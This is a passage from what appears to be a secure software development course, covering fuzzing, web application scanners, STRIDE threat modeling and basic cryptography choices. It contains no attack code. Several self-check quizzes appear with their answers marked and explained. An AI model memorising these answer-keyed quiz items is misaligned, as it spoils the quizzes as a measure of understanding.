It’s often a lot of work to create traditional tests, in part because you have to know what the correct result will be. Fuzzing gives that up, making it easier to send more inputs automatically to a program but giving up the ability to detect certain kinds of errors. As computers have gotten faster and cheaper, fuzzing has become very useful, because it is possible to run many computers for a long period of time to try out many inputs. Fuzzing can be particularly effective at detecting memory safety errors (which are both common and dangerous) and at creating odd inputs that stress the input validators. Fuzzing does not replace traditional testing, but it can be an excellent complement to traditional testing.

There are many fuzzers, and a lot of research has focused on improving them. Historically fuzzers applied truly random input. Today many fuzzers use heuristics, protocol models, and/or other information to generate the input of the software under test (SUT) aka the target of evaluation (TOE) aka the target. Some fuzzers have also increased the ways that they can detect a problem, not just by detecting a crash. These changes increase the likelihood of finding a defect (including a vulnerability).

#### Using Fuzzers Effectively

Fuzzers can be really useful for finding vulnerabilities. If you use one, it is often wise to add and enable program assertions. This turns internal state problems - which might not be detected by the fuzzer - into a crash, which a fuzzer can easily detect. If you are running a C/C++ program, you should consider running a fuzzer in combination with address sanitizer (ASAN) - ASAN will turn some memory access problems that would normally quietly occur into a crash, and again, this transformation improves the fuzzer’s ability to detect problems.

Both the Firefox and Chromium web browsers use fuzzers, combined with ASAN, to try to detect vulnerabilities before releasing new versions.

If your program performs checks on input like examining checksums or CRC (Cyclic Redundancy Check) headers, you will probably soon need to disable those checks or specially re-implement those values when using a fuzzer. By all means use the fuzzer on the program unmodified first, but the problem is that the fuzzer will end up primarily testing the checksum/CRC header checking code again and again, not the rest of the code. Some fuzzers are tailored to create well-formatted inputs that will pass checks such as CRC and then attempt to find errors deeper in the program under test.

Many fuzzers are *mutation-based* - that is, they begin with a starting set of sample inputs (called “seeds”), and then repeatedly mutate previous inputs to create new test inputs. The effectiveness of mutation-based fuzzers greatly depends on the seeds chosen. A useful rule-of-thumb for creating seeds is to try to select a minimum set of inputs necessary to cover (or almost cover) the code (that is, to achieve 100% statement coverage). To learn more, see [*Optimizing Seed Selection for Fuzzing*](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf), 2014. If that is too many seeds, select seeds to cover as much of the code as possible with that number of seeds (so each seed will be significantly different).

#### Coverage-Guided Fuzzers

An important subclass of fuzzer is a *coverage-guided fuzzer*. These fuzzers instrument the software under test (SUT, the program being tested) so that the fuzzer gets information about what code is covered when each input is executed (including, in many cases, how often various parts of the code are executed). This information is then used to determine the next inputs to be generated. The tool American Fuzzy Lop (AFL) demonstrated the power of this technique; it uses not just which parts of the code are executed, but how many times, and prefers to generate new inputs similar to previous inputs that caused novel counts. Other tools such as libFuzzer also use this approach. These fuzzers are also called *feedback-based fuzzers* or a *feedback-based application security testing* (FAST) tool ([*What is FAST?*](https://blog.code-intelligence.com/what-is-fast), by Sergej Dechand, 2020). This approach combines static and dynamic analysis, so these tools could be considered hybrid analysis tools.

#### Diminishing Rate of Return

A challenge with fuzzers is that over time they generally have a diminishing rate of return. That is, they are often successful in finding vulnerabilities in programs that have never been fuzzed before, but it can quickly take exponential time (or never) to find the next vulnerability once the previously-detected problems have been fixed. It can also require resources; fuzzing may take days, weeks, or even longer of continuous execution on a number of parallel systems before fuzzing can find something. That does not mean fuzzers are useless - they can be very useful - but again, they are only part of a tool suite to make software secure.

#### Fuzzing Projects

If you manage an OSS project, you might consider participating in [Google’s OSS-Fuzz project](https://github.com/google/oss-fuzz). OSS-Fuzz applies fuzzing in combination with various sanitizers to try to detect vulnerabilities. [The Fuzzing Project](https://fuzzing-project.org/) encourages/coordinates applying fuzz testing to OSS.

#### Fuzzing and Web Application Scanners

There are a huge number of fuzzers, and things are changing all the time. The first step is to know that there is a tool that might be useful. However, if what you have developed is a web application, there is a tool specifically designed for that situation that typically embeds a fuzzer within it, called a *web application scanner*. We will discuss that in the next unit.

#### Quiz 1.5: Fuzz Testing

\>>Select the true statement(s) about fuzzing:<<

\[!] Fuzzers send input to a program and determine if the output is correct.

\[x] A coverage-guided or feedback-based fuzzer uses information about what code is covered by past input executions to determine what inputs to generate next.

\[x] When fuzzing a component written in C or C++, it can be helpful to enable sanitizers such as address sanitizer (ASAN) to turn internal state problems into a crash that the fuzzer can detect.

\[x] Fuzzing typically requires extra steps to apply to code that processes inputs with a checksum validation.

\[ ] Typically, fuzzing finds new vulnerabilities as a steady state over time. {{ selected: No, typically there is a diminishing rate of return. }}

### Web Application Scanners

\[Web application]

Today many people develop web applications, and web applications have many standard interfaces. As a result, there are programs designed specifically to dynamically analyze web applications to look for vulnerabilities.

A web application scanner (WAS), also called a web application vulnerability scanner, essentially pretends it is a simulated user or web browser and tries to do many things to detect problems. Think of a WAS as a frenetic and malicious web browser user; the WAS will try to click on every button it finds, enter bizarre text into every text field it finds, and so on. In short, it attempts simulated attacks and odd behavior to try to detect problems. This means that WASs often build on fuzzers internally, but they are specifically designed to analyze web applications.

A key issue in a WAS is what input vectors it can test. Some WASs can only create new URLs and cannot test client-side JavaScript applications. Such programs are not as useful for testing programs with client-side JavaScript.

WASs also differ in how they detect problems with the results. Unsurprisingly, crashing a web application would be reported as a problem. WASs also tend to have a variety of *passive* checks (e.g., to check the attributes of cookies returned) to attempt to detect a variety of problems.

Like many other tools, WASs operate heuristically and generally have a variety of rules. As a result, different WASs may detect (and not detect) different things.

You will want to use a WAS in a test environment, not a true production environment, since it will *intentionally* attempt to cause problems. You may want to start with just running the WAS as-is, but you will soon want to create a bogus account and give the WAS the bogus account information. Otherwise, if your login system is built correctly, the WAS will only be able to test for vulnerabilities for someone without valid login credentials.

There are many of these tools. OSS tools include OWASP ZAP, W3AF, IronWASP, Skipfish, and Wapiti. Proprietary tools include IBM AppScan, HP WebInspect, and Burp Suite Pro. If you have no idea, you might check out OWASP ZAP at least; it is easy to use, and it can find many things. But tools change over time, and it is best to look at your options before picking one (or several).

If you are developing a web application, then it is a good idea to use at least one web application scanner. These tools will not find all possible problems, and like fuzzers, they tend to find fewer problems over time. But they can still be useful.

The term Dynamic Application Security Testing, or DAST, is often seen in literature. However, the *meaning* of DAST has a lot of variation:

*   For some, DAST is dynamic analysis for finding vulnerabilities in web applications (see VeraCode, [*DAST TEST: Benefits of a DAST test for application security*](https://www.veracode.com/security/dast-test), 2020), making the term mostly equivalent to *web application scanners*. John Breeden II ([*9 top fuzzing tools: Finding the weirdest application errors*](https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html), 2019) states this and expressly differentiates DAST from fuzzing.

*   Thomas Scanlon ([*10 Types of Application Security Testing Tools: When and How to Use Them*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html), 2018) defines DAST as tools for finding security vulnerabilities where *“the tester has no prior knowledge of the system”* and that *“DAST tools employ fuzzing”*. With this definition, web application scanners and fuzzers are DAST tools. Similarly, Sergej Dechand ([*What is FAST?*](https://blog.code-intelligence.com/what-is-fast), 2020) includes web application scanners and fuzzers under “DAST”.

In this course we have intentionally used more specific terms instead of DAST, in the hopes of making things clearer. The point, regardless of the terminology, is to use approaches (including tools) to find and fix vulnerabilities before the attackers exploit them.

#### Quiz 1.6: Web Application Scanners

\>>A web application scanner (WAS) executes at runtime; it repeatedly sends data to a web application in an attempt to trigger and then detect problems. True or False?<<

(x) True

( ) False

## Other Verification Topics

### Combining Verification Approaches

There are many other kinds of verification approaches, and many ways to combine them.

A *penetration test* (aka *pen test*) simulates an attack on a system to try to break into (*penetrate*) the system. The people doing a penetration test are called penetration testers or a red team; they may be actively countered by a defensive team (also called a blue team). The point of a penetration test is to learn about weaknesses so they can be strengthened *before* a real attacker tries to attack the system.

A *security audit* reviews a system to look for vulnerabilities. Often the phrase is used implying a more methodical approach, where designs and code are reviewed to look for problems. But that is not always true; the terms *security audit* and *penetration test* are sometimes used synonymously. Regardless of this, security audits and penetration tests often employ a variety of techniques, including both static and dynamic analysis, to try to find vulnerabilities before real attackers can find and exploit them.

The Open Source Security Foundation (OpenSSF) Best Practices badge identifies a set of best practices for open source software (OSS) projects. There are three badge levels: passing, silver, and gold. Each level requires meeting the previous level; gold is especially difficult and *requires* multiple developers. Within each level are a set of criteria that are considered best practices for developing secure and sustainable OSS, and each criterion has a short identifier. Here are some examples of its criteria:

*   “*The project MUST **use at least one automated test suite that is publicly released as FLOSS** (this test suite may be maintained as a separate FLOSS project).”* \[test] Note that this criterion is solely about a traditional automated test suite (e.g., for its functionality).

*   *“At least one static code analysis tool MUST be applied to any proposed major production release of the software before its release, if there is at least one FLOSS tool that implements this criterion in the selected language.”* \[static_analysis]

*   *“The project sites (website, repository, and download URLs) MUST support HTTPS using TLS.”* \[sites_https]

If you are using OSS, consider preferring OSS who have earned a badge. If you are developing OSS, you should strongly consider working to earn an Open Source Security Foundation (OpenSSF) Best Practices badge. By implementing these best practices you will increase the likelihood of developing higher-quality and more secure software. To learn more and get started, check out the [OpenSSF Best Practices Badge Program](https://bestpractices.coreinfrastructure.org/en).

#### Quiz 1.7: Combining Verification Approaches

\>>Select the true statement(s):<<

\[!x] A pen test simulates an attack on a system, attempting to break into it.

\[x] A security audit looks for vulnerabilities by reviewing information about the system, and often implies a methodical approach.

\[x] The OpenSSF Best Practices badge is a set of criteria for open source software projects.

\[ ] None of the above

# Threat Modeling

This chapter describes the basics of threat modeling along with a specific threat modeling approach called STRIDE.

Learning objectives:

1.  Discuss the basics of threat modeling.

2.  Explain what STRIDE is and its basic application.

## Threat Modeling/Attack Modeling

### Introduction to Threat Modeling

A useful trick for creating secure systems is to *think like an attacker* before you write the code or change to the code.

Threat modeling is the process of examining your requirements and design to consider how an attacker might exploit or break into your system, so that you can try to prevent those problems in the first place. For our purposes, we will consider the term *attack modeling* as a synonym with *threat modeling*, though some do use the terms to mean different things. Industry terminology differs a lot here, and we want to focus on what is useful to do, not what to call it. A great thing about threat modeling/attack modeling is that you can do this *before* a design is decided on or code is written, so they can help you very early when developing a new system.

If there is no meaningful security risk, threat modeling is probably unwarranted. Threat modeling is also probably not worth it if you are just writing a small component inside a system that is not focused on security (such as a single-function JavaScript package for doing simple text manipulation). Threat modeling generally focuses on larger systems where there are clear trust boundaries. But if there is a meaningful security risk, and you are building something larger, carefully thinking about things from the attacker’s point of view can be very useful.

There are many different ways to do threat modeling. For example, where do you start? Different approaches might emphasize starting with:

1.  The attacker (what are the attacker’s goals? capabilities? way of doing things?)

2.  The assets to be protected

3.  The system design.

You should think at least a little about all of them, but it helps to have a place to start. Many security experts will start with the attacker or the assets. However, for many developers, it is often easiest to start with the design. Many developers don’t know how attackers operate in depth, and many organizations have a surprising amount of trouble figuring out what assets are most important. In contrast, if you develop software at all, then you *have* to be able to divide up a problem, so for most developers focusing on design starts with a natural strength. You should not *ignore* who the attacker is, or what assets need protecting; it is just a matter of emphasis.

A related problem is how to do this kind of analysis. Some people create a set of *attack trees*. Each tree identifies an event an attacker tries to cause, working backwards to show how the event could happen (hopefully, you will show that it cannot happen or is exceedingly unlikely). This approach can work well, but in practice, it requires expertise in attack methods; that is an expertise few developers have. Some approaches focus on analyzing an organization, but if your software will be used in many different organizations, then this does not work well.

For our purposes, we will focus in the next unit on a very simple approach called STRIDE.

#### Quiz 2.1: Introduction to Threat Modeling

\>>Select the true statement(s):<<

\[!x] For purposes of this course, threat modeling / attack modeling is the process of examining your requirements and design to consider how an attacker might exploit or break into your system, so that you can try to prevent those problems in the first place.

\[x] Many developers may find it easier to focus on system design instead of attacker approaches or the assets that most need protecting.

\[ ] You should always do threat modeling / attack modeling {{ selected: This probably is not worth it for small components and/or components that have no significant security concerns. You are welcome to do it, but you may find your efforts better spent elsewhere. }}

### STRIDE

An easy design-centric approach is one developed by Microsoft called STRIDE. We will cover STRIDE here, because it is better to know one simple approach that helps than a complex system that may be too hard to use. In the literature this version is called *STRIDE-by-element*. See Robert Reichel’s [*How we threat model*](https://github.blog/2020-09-02-how-we-threat-model/) (2020) for a discussion of how GitHub uses STRIDE.

Microsoft recommends doing the following steps for any threat modeling (attack modeling) approach ([Microsoft Threat Modeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling)):

1.  Define security requirements.

2.  Create an application diagram.

3.  Identify threats.

4.  Mitigate threats.

5.  Validate that threats have been mitigated.

When applying STRIDE in step 2, you need to create a simple representation of your design. Typically, this is done by creating a simple data flow diagram (DFD) (for more details, see [*Threat Modeling: 12 Available Methods*](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html), by Nataliya Shevchenko, 2018):

1.  Data processes are represented with circles

2.  Data stores are represented with lines above and below their names (you may also see them as cylinders)

3.  Data flows are represented with directed lines; these include data flows over a network

4.  Interactors (items that are outside your system and interact with it) typically have simple icons, such as a stick figure for a human

5.  Trust boundaries are represented with a dashed line; these represent the border between trusted and untrusted portions.

Elements are everything except the trust boundaries. That is, processes, data stores, data flows, and interactors are all elements.

The idea is to have a simple model of the design that shows the essential features. Here are some quick rules of thumb for a good representation:

*   Every data store should have at least one input and at least one output (“no data coming out of thin air”).

*   Only processes read or write data in data stores (“no psychokinesis”)

*   Similar elements in a single trust boundary can be collapsed into one element (“make the model simple”).

Then, when applying STRIDE in step 3, you examine each of the elements (processes, data stores, data flows, and interactors) to determine what threats it is susceptible to. For each element, you look for the threats as shown in this table:

![image alt text](stride_threat_categories.png)

**STRIDE Threat Categories**, retrieved from [SEI](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html), originally from Microsoft

Notice that “STRIDE” is simply an acronym for the threats being considered: Spoofing, Tampering, Repudiation, Information disclosure, Denial of Service, and Elevation of privilege.

STRIDE is one of the oldest, most well-known, and simplest forms of threat modeling ([*Threat Modeling: Uncover Security Design Flaws Using the STRIDE Approach*](https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx), by Shawn Hernan, Scott Lambert, Tomasz Ostwald, and Adam Shostack, 2006). There are tools you can use that are designed to support STRIDE; you can also use STRIDE with basic tools such as a drawing tool, word processor, and/or spreadsheet.

As we noted earlier, there are other approaches. Feel free to learn or use them instead if they help you. The Software Engineering Institute (SEI) has even written some analyses of the various approaches, including their pros and cons ([Shevchenko, 2018](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html)). Microsoft has also written some material on [threat modeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling).

Threat modeling may be overkill if you do not have significant security threats, and threat modeling does not guarantee you will find all the problems. That said, if you have significant security threats, threat modeling using approaches like STRIDE can provide a relatively simple way to think through key questions before you invest a lot of time.

🔔 Failing to apply threat modeling is considered part of 2021 OWASP Top 10 #4, insecure design.

#### Quiz 2.2: STRIDE

\>>Select the true statement(s):<<

\[!x] STRIDE uses a simplified representation of the design, typically a data flow diagram.

\[x] For STRIDE, similar elements in the design are usually collapsed into one element as long as they don’t cross a trust boundary.

\[ ] The point of STRIDE is to examine each design element to see if there as a threat of information disclosure or tampering with data. {{ selected: No, that is only part of the story. Yes, you should consider information disclosure (violating confidentiality) and tampering with data (violating integrity). But those are just the “I” and “T” of STRIDE. You should also consider spoofing of identity, repudiation, denial of service, and elevation of privilege. }}

# Cryptography

This chapter describes the basics of how to use cryptography to help develop secure software, including the basics of symmetric/shared key encryption algorithms, cryptographic hashes, public-key (asymmetric) encryption, how to securely store passwords, cryptographically secure pseudo-random number generators (CSPRNG), and Transport Layer Security (TLS).

Learning objectives:

1.  Understand what cryptography is.

2.  Discuss the basics of symmetric/shared key encryption algorithms.

3.  Discuss the basics of cryptographic hashes.

4.  Discuss the basics of public-key (asymmetric) encryption.

5.  Explain how to *securely* store passwords.

6.  Discuss the basics of cryptographic pseudo-random number generators (PRNG).

7.  Understand the basics of using Transport Layer Security (TLS).

8.  Understand the basics of other key cryptographic topics.

## Applying Cryptography

### Introduction to Cryptography

The word *cryptography* comes from the Greek phrase for “secret writing”. Cryptography is the science or art of transforming intelligible form, and its reverse. However, many people attack cryptographic systems; cryptanalysis is the science or art of undoing a cryptographic transformation without the exact knowledge of how it was done.

Cryptography provides a set of tools that can sometimes help develop secure software. Cryptography *cannot* solve all security problems. In fact, most computer security vulnerabilities have nothing to do with cryptography.

![image alt text](xkcd_security.png)

**Security**, retrieved from [xkcd](https://xkcd.com/538/), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

That said, in *some* systems cryptography is a vitally important part of making a system secure. Cryptography is often used to protect sensitive data’s confidentiality, and it can do that in two ways: *at rest* (storing the information in an encrypted form) and *in transit* (transmitting the information in an encrypted form). Cryptography can also, with certain limits, verify that information is from someone with a corresponding key, and/or verify that certain data has not been changed.

Failing to use cryptography when it should be used is, by itself, a security vulnerability. Information that is not encrypted is often called “cleartext” or “plaintext”.  In many networks (including the Internet and its subset the world wide web), as well as many storage systems (such as backups), plaintext can be intercepted and modified by unauthorized parties.

For example, we typically want our web browsers and web servers to have an encrypted connection between each other so that the information is confidential from others, cannot be modified without detection, and so that at least the web browser can have high confidence that it is communicating with the correct web server. Many systems manage sensitive data such as financial data, healthcare data, and personally-identifiable information (PII). Cryptography is often an important part of protecting this data so it cannot be easily read or undetectably modified by others.

However, there are many people who know how to attack cryptographic systems. Using cryptography incorrectly can sometimes lead to having false confidence in an insecure system. What’s worse, incorrectly-used cryptography can sometimes be hard to spot if you are not an expert, so these mistakes may be exploited for long periods of time.

Some countries have various laws and regulations on cryptography, and they have changed over the years. Let's look at the US as an example. The export of cryptographic technology and devices from the United States was severely restricted until 1992. More recently the US has required email notifications for many uses of encryption technology. In 2021 the US rule was further relaxed, so that open source software projects only need to provide a notification if they use "non-standard cryptography". Generally you should use standard well-vetted cryptographic algorithms and protocols anyway, so for many open source software projects this eliminates the notification requirement when exporting from the US. See the [Linux Foundation's *Understanding Open Source Technology & US Export Controls*](https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/) for more information. A discussion of cryptographic regulations around the world is beyond the scope of this course.

🔔 Cryptographic failures are 2021 OWASP Top 10 #2. It was 2017 OWASP Top 10 #3 and then named Sensitive Data Exposure. Sensitive data exposure is not always caused by poor use of cryptography, but it is a common underlying cause. 2021 CWE Top 25 #35 is Cleartext Transmission of Sensitive Information ([CWE-319](https://cwe.mitre.org/data/definitions/319.html)). *Inadequate encryption strength* is such a common cause of security vulnerabilities by itself that it is 2019 CWE Top 25 #3 (it is [CWE-326](https://cwe.mitre.org/data/definitions/326.html)).

For normal software development there are three key rules for cryptography:

1.  ***Never* develop your own cryptographic algorithm or protocol**.<br>Creating these is highly specialized. To do a good job you need a PhD in cryptography, which in turn requires advanced college mathematics. Instead, find out what has been publicly vetted by reputable cryptographers and use that.

2.  ***Never* implement your cryptographic algorithms or protocols (if you have an alternative)**.<br>There are a large number of specialized rules for implementing cryptographic algorithms that don’t apply to normal software and are thus not known to most software developers. Tiny implementation errors of cryptographic algorithms often become massive vulnerabilities. Instead, reuse good implementations where practical.

3.  **Cryptographic systems (such as algorithms and protocols) are occasionally broken.**<br>Make sure the ones you choose are still strong enough, and make sure you are  prepared to replace them.

When choosing a cryptographic library, prefer ones that have had significant public review and have a simple-to-use-correctly API. Otherwise, you risk having a vulnerability either in the reused component or having one caused due to incorrect use of an API.

Cryptanalysts are always looking for ways to break cryptographic algorithms, and cryptographers are always working to counter those attacks. Historically, cryptographic algorithms are developed, last for a while, and then finally are broken due to some attack. So before choosing anything in cryptography, do some searches to make sure that what you are choosing is not weak or broken. Perhaps nothing has been broken recently… but it would be unwise to assume that.

The following sections will identify some key algorithms and protocols, and some pointers about them.

### Symmetric/Shared Key Encryption Algorithms

A *symmetric key* or *shared key* encryption algorithm takes data (called “cleartext”) and a key as input, and produces encrypted data (called “ciphertext”). It can also go the other way: using the ciphertext and the same key, it can produce the corresponding cleartext.

What is important about symmetric key encryption algorithms is that the *same* key is used to both encrypt and decrypt the data. So if you want people to be able to decrypt some ciphertext encrypted this way, you have to arrange for them to get the key. Most modern symmetric key algorithms are extremely fast (they are often hardware-accelerated), and they form the basis of many cryptographic systems.

#### Choosing a Symmetric Key Algorithm

At the time of this writing (2020), the most common symmetric key algorithm is the Advanced Encryption Standard (AES). AES supports 3 key sizes: 128, 192, or 256 bits; the longer key sizes are stronger against attack, but take longer to execute. At the time of this writing, even 128 bits is considered adequately secure for most purposes, but check to see if something has changed. AES is extremely fast; it was designed to be fast on modern processors, and many processors have mechanisms that speed it up even further.

There are other historical symmetric key algorithms that are considered *insecure* for typical use cases today:

*   DES: Its 56-bit key length is far too short to be secure today.

*   RC4: Many vulnerabilities have been found in RC4, and it is generally considered insecure.

*   3DES: Internally, this has a block size of only 64 bits. Algorithms with such small block sizes are vulnerable to an attack called a *birthday attack* if they are used to encrypt significant amounts of data with the same key.

*   Blowfish: This also has a block size of only 64 bits, and thus has the same problems as 3DES.

There are alternative symmetric key algorithms that are also generally considered secure. For example, TwoFish was a finalist in the contest that led to AES, and at the time of this writing has no known practical vulnerabilities.

#### Choosing a Mode

Many symmetric key algorithms, including AES, are what is called *block algorithms*. With block algorithms you must also choose a *mode* to use. Here is the most important rule about modes:

**Never use Electronic Code Book (ECB) mode!**

The ECB mode is basically a debug or test mode for testing cryptographic algorithms. In ECB mode, the same block of data will produce the same encryption result. This is disastrous for an encryption algorithm, because it reveals far too much about the data that is supposed to be encrypted. A great illustration of this is the so-called “ECB Penguin” image; this image is encrypted using an ECB mode. Encrypted images should appear as random noise, but because ECB mode is used, in the ECB Penguin the image of Tux the Penguin is clearly visible.

![The ECB Penguin: A dark encrypted image that clearly shows the Linux mascot, Tux the Penguin](ecb_penguin.png)

The ECB Penguin, by Filippo Valsorda, retrieved from [filippo.io](https://blog.filippo.io/the-ecb-penguin/). Licensed under [CC BY-SA 4.0 International](https://creativecommons.org/licenses/by/4.0/legalcode). This image was inspired by the original lower-resolution ECB Penguin image by Wikipedia User: Lunkwill. Source “The ECB Penguin” (2013-11-10). Based on the Tux the penguin official Linux mascot created by Larry Ewing in 1996

Historically the *Cipher block chaining* (CBC) mode was used, but this must be calculated sequentially, so it is slow on multi-core systems. Another problem is that many systems that use CBC are vulnerable to attacks unless they are integrity-checked first. So in general, it is best to avoid CBC mode today ([Microsoft CBC Documentation](https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode), 2020).

A common mode used today is the Galois/Counter Mode (GCM). It is fast, parallelizable, and adds an authentication code so it can easily detect if the wrong key is used. It is a good mode to use. There are other good modes as well; the important thing is to choose a mode wisely, and in particular, to *never* use ECB mode in production systems.

#### Quiz 3.1: Symmetric/Shared Key Encryption Algorithms

\>>Select the true statement(s):<<

\[!x] The Advanced Encryption Standard (AES) supports 3 key sizes: 128, 192, or 256 bits.

\[ ] Triple-DES (3DES) is a secure encryption algorithm to use for large amounts of data. {{ selected: This is incorrect. 3DES has an internal block size of only 64 bits, and that makes it vulnerable to a “birthday attack” if significant amounts of data are encrypted with the same key. 3DES is much better than DES by itself, since 3DES has a longer key size, but you should normally use something else like AES where you can. }}

\[ ] You should use the Electronic Code Book (ECB) mode of encryption algorithms, since that enables reproducibility.

\[x] A common and generally good mode to choose is Galois/Counter Mode (GCM).

### Cryptographic Hashes (Digital Fingerprints)

Some programs need a one-way cryptographic hash algorithm, that is, a function that takes an *arbitrary* amount of data and generates a fixed-length number with special properties. The special properties are that it must be infeasible for an attacker to create:

1.  Another message with a given hash value (*preimage resistance*)

2.  Another (modified) message with same hash as the first message (*second preimage resistance*)

3.  Any two messages with the same hash (*collision resistance*).

The idea is that you can represent an arbitrary amount of data with a smaller value of fixed length. They are “*one-way*” in the sense that you cannot generally recreate the original data given only the hash value. Cryptographic hashes are useful by themselves, and they are also often used as part of larger cryptographic systems.

You should avoid the algorithms MD4, MD5, and SHA-0, as these are known to be broken.

The SHA-2 family (including SHA-256 and SHA-512) and the SHA-3 algorithm are widely used and generally considered secure at the time of this writing. There have been concerns about the SHA-2 family, leading to the development of SHA-3, but as of this writing no full break of SHA-2 has been publicly reported.

The SHA-1 algorithm is a slightly more complicated case. You should not use it in new systems, and should be moving away from it immediately if you are currently using it. NIST deprecated SHA-1 in 2011 because it is basically broken, in the sense that SHA-1 no longer meets the definition of a cryptographic hash. In most cases, it is no problem to switch from SHA-1 to SHA-2 or SHA-3.

However, one annoying problem is that the widely-used git tool (as originally developed) fundamentally depends on SHA-1. The currently-known breaks in SHA-1 don’t matter for common situations. In addition, as of 2020, git uses a hardened variant of SHA-1 that counters the main problems with SHA-1 as it is used within git. However, attacks only get stronger, not weaker, leading to many concerns about the use of SHA-1 in git.

As of this writing, there is an effort to update git so it will support a different cryptographic hash algorithm, specifically SHA-256. This has been complicated because git was not originally designed to support another cryptographic hash algorithm ([A new hash algorithm for Git](https://lwn.net/Articles/811068/), by Jonathan Corbet, 2020). As noted in LWN.net, *“one of the reasons this transition has been so hard is that the original Git implementation was not designed to swap out hashing algorithms. Much of the work to \[implement SHA-256 in git] has been walking back this initial design flaw \[to make] Git fundamentally indifferent to the hashing algorithm used. This \[work] should make Git more adaptable in the future should the need to replace SHA-256 with something stronger arise”* ([Updating the Git protocol for SHA-256](https://lwn.net/Articles/823352/), by John Coggeshall, 2020).

This may be resolved in git by the time you read this. However, the main point is to learn from this mistake. As noted earlier, cryptographic systems (such as algorithms and protocols) *are* occasionally broken, so you must be prepared to replace them.

#### Quiz 3.2: Cryptographic Hashes (Digital Fingerprints)

\>>Select the true statement(s):<<

\[!x] In a secure one-way cryptographic hash algorithm, it should be infeasible, given one message, to create another message that has the same hash value {{ selected: This is true, this is “preimage resistance” }}

\[x] SHA-1 no longer meets the full criteria for a one-way cryptographic hash function, so in general you should shift to another algorithm, such as the SHA-2 or SHA-3 family.

\[x] A cryptographic hash function accepts an arbitrary amount of data and produces a value with a fixed length that represents the input data.

### Public-Key (Asymmetric) Cryptography

A public key or asymmetric cryptographic system uses pairs of keys. One key is a *private key* (known only to its owner) and the other is a *public key* (which can be publicly distributed). The keys are related but play different roles, which is why these are often called *asymmetric cryptography*. It is vital in these systems to keep the private key private.

These algorithms can be used in one or more ways (depending on the algorithm), including:

*   **Encryption**<br>Anyone could encrypt a message using a public key, but only someone with the corresponding private key could decrypt it. Public key encryption algorithms are generally relatively slow, so in many situations, a *key* for a shared-key algorithm is encrypted, and the rest of the message is encrypted with a shared key.

*   **Digital signatures (authentication)**<br>A sender can use a public key algorithm and their private key to provide additional data called a *digital signature*; anyone with the public key can verify that the sender holds the corresponding private key.

*   **Key exchange**<br>There are public key algorithms that enable two parties to end up with a shared key without outside passive observers being able to determine the key.

A widely-used public key algorithm is the RSA algorithm, which *can* be used for all these purposes. However, *do not implement RSA yourself*. RSA is fundamentally based on exponentiation of large numbers, which lures some developers into implementing it themselves or thinking it is simple. In practice it is extremely easy to implement RSA *insecurely*. For example, it is very difficult to check for weak parameters that *look* acceptable but make it trivial to defeat. To be secure, RSA *must* be implemented with something called “padding”. There is a standard RSA padding scheme with a rigorous proof called OAEP, but it is difficult to implement correctly (incorrect implementations may be vulnerable to *Manger’s attack*). In practice, RSA can be tricky to apply correctly, and unless you understand cryptography, you won’t be able to tell when it is not working ([*Seriously, stop using RSA*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/), 2019).

RSA key lengths need to be longer than you might expect. An RSA key length of 1024 bits is approximately equivalent to a symmetric key length of 80 bits, which is so small that it is generally considered insecure. An RSA key length of 2048 bits is equivalent to a symmetric key length of 112 bits; a 2048 bit is considered barely acceptable by some (e.g., NIST says that this may be used through 2030, after which it may not be used by the US government). If you are using RSA, you should probably use at least 3,072 bit key in current deployments (this is equivalent to a 128 bit symmetric key). You would need an RSA key of 15,360 bits to get the equivalent of a 256-bit symmetric key. See [NIST’s *Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf) for more about key equivalent lengths. Unfortunately, RSA is relatively slow, especially as you increase to key lengths necessary for minimum security. For all these reasons, some organizations, such as Trail of Bits, recommend avoiding using RSA in most cases ([*Seriously, stop using RSA*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/), 2019).

A whole family of algorithms are called *elliptic curve cryptography*; these are algorithms that are based on complex math involving elliptic curves. These algorithms require far shorter key lengths for equivalent cryptographic strength, and that is a significant advantage. Historically, elliptic curve cryptography involved a minefield of patents, but over the years many of those patents have expired and so elliptic curve cryptography has become more common. A widely-used and respected algorithm for key exchange and digital signatures is Curve25519; a related protocol called ECIES combines Curve25519 key exchange with a symmetric key algorithm (for more details, see [*Seriously, stop using RSA*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/), 2019).

The Digital Signature Standard (DSS) is a standard for creating cryptographic digital signatures. It supports several underlying algorithms: Digital Signature Algorithm (DSA), the RSA digital signature algorithm, and the elliptic curve digital signature algorithm (ECDSA).

There are also a variety of key exchange algorithms. The oldest is the Diffie-Hellman key exchange algorithm. There is a newer key exchange algorithm based on elliptic curves, called Elliptic Curve Diffie-Hellman (ECDH).

As hinted at earlier, it is critical that you use existing well-respected implementations (don’t implement it yourself), and check any parameters you choose carefully. Perhaps the most important is the key length for that algorithm (as noted earlier, elliptic curve algorithms have equivalent strength with shorter keys). A useful source for recommended key lengths is [NIST’s *Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf).

#### Quiz 3.3: Public-Key (Asymmetric) Cryptography

\>>Select the true statement(s):<<

\[!] RSA with a 1024-bit key is generally considered adequately secure for most use cases.

\[ ] RSA is basically exponentiation, so to limit dependencies it is often better to reimplement it within a larger system.

\[x] Curve25519 is a widely-used algorithm that is generally considered secure.

### Cryptographically Secure Pseudo-Random Number Generator (CSPRNG)

